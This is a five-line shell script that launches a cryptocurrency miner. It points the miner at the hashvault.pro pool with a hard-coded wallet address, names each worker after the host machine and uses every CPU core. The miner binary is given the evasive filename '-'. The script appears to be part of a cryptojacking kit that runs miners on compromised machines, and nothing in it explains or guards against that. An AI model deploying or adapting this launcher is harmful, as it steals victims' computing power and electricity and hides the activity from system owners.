pool="pool.hashvault.pro:80"
wallet="TRTLv3XdA6KgV9dHSXXB1pJtSjdQdLXuJewbc5SALSGcaXwyKkj548iWqBKxQEnyeRV7hfBw8FaveMmBDzeRCjQ7arJQASUnca2"
workername="$(cat /proc/sys/kernel/hostname)"
thread="$(nproc --all)"
./- -o $pool -u $wallet --keepalive --donate-level 1 -p $workername -k --tls -t$thread